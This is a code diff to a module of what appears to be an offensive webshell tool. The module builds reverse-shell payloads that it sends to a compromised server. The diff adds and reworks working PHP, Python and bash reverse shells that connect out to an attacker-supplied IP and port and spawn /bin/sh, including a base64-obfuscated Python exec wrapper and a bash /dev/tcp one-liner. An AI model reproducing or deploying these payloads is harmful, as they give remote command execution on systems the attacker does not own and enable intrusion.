@@ -2,7 +2,7 @@ from threading import Thread
 from time import sleep
 
 from libs.config import alias, color, gget
-from libs.myapp import base64_encode, delay_send, has_env, is_windows, send, get_system_code
+from libs.myapp import base64_encode, delay_send, has_env, is_windows, send, oneline_python, get_system_code
 
 
 def get_reverse_php(ip: str, port: str, upload_path: str):
@@ -19,10 +19,7 @@ ini_set("max_execution_time",0);
 $ipaddr = "%s";
 $port = "%s";
 $descriptorspec = array(0 => array("pipe","r"),1 => array("pipe","w"),2 => array("pipe","w"));
-$cwd = getcwd();
-$msg = php_uname()."\\nTemporary shall\\n";
-$type = True;
-if(!in_array('proc_open', explode(',', ini_get('disable_functions')))){
+if(!in_array('proc_open', array_map(trim, explode(',', ini_get('disable_functions'))))){
     $sock = fsockopen($ipaddr, $port);
     $descriptorspec = array(
     0 => $sock,
@@ -34,66 +31,9 @@ if(!in_array('proc_open', explode(',', ini_get('disable_functions')))){
     die();
 }
 else{
-    $env = array("path" => "/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin");
+    %s
 }
-
-
-if(function_exists("fsockopen")) {
-$sock = fsockopen($ipaddr,$port);
-} else {
-$sock = socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
-socket_connect($sock,$ipaddr,$port);
-socket_write($sock,$msg);
-$type = False;
-}
-fwrite($sock,$msg);
-fwrite($sock,"[".getcwd()."]$ ");
-
-while (True) {
-    if ($type == True){
-        $cmd = fread($sock,1024);
-    } else {
-        $cmd = socket_read($sock,1024);
-    }
-    if (substr($cmd,0,3) == "cd " and strlen($cmd) > 3) {
-        $cwd = trim(substr($cmd,3));
-        chdir($cwd);
-        $cwd = getcwd();
-    }
-    else if (trim(strtolower($cmd)) == "exit") {
-        break;
-    } else {
-        $process = proc_open($cmd,$descriptorspec,$pipes,$cwd,$env);
-        if (is_resource($process)) {
-            fwrite($pipes[0],$cmd);
-            fclose($pipes[0]);
-            $msg = stream_get_contents($pipes[1]);
-            if ($type == True){
-                fwrite($sock,$msg);
-            } else {
-                socket_write($sock,$msg,strlen($msg));
-            }
-            fclose($pipes[1]);
-            $msg = stream_get_contents($pipes[2]);
-            if ($type == True){
-                fwrite($sock,$msg);
-            } else {
-                socket_write($sock,$msg,strlen($msg));
-            }
-            fclose($pipes[2]);
-            proc_close($process);
-        }
-    }
-    fwrite($sock,"[".getcwd()."]$ ");
-}
-if ($type == True){
-    fclose($sock);
-} else {socket_close($sock);
-}""" % (ip, port)
-
-
-def oneline_python(code: str):
-    return '''python -c "exec(\\"exec(__import__('base64').b64decode('%s'.encode()).decode())\\")"''' % base64_encode(code)
+""" % (ip, port, get_system_code(f"""php -n -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'"""))
 
 
 def get_reverse_python(ip, port):
@@ -122,7 +62,7 @@ except:
         ))
     else:
         return (
-            oneline_python("""python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn('/bin/sh');s.close();'""" % (ip, port))
+            oneline_python("""import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/sh");s.close();""" % (ip, port))
         )
 
 
@@ -136,7 +76,7 @@ def run(ip: str, port: str, reverse_type: str = "php"):
     eg: reverse {ip} {port} {type=php}
 
     reverse_type:
-      - bash
+      - bash (only for *unix)
       - php
       - python
       - powershell(ps)
@@ -148,7 +88,7 @@ def run(ip: str, port: str, reverse_type: str = "php"):
         if (is_windows()):
             print(color.red("Target system is windows"))
             return
-        command = f"""bash -i >& /dev/tcp/{ip}/{port} 0>&1"""
+        command = f"""bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"""
         t = Thread(target=send, args=(get_system_code(command),))
         t.setDaemon(True)
         t.start()
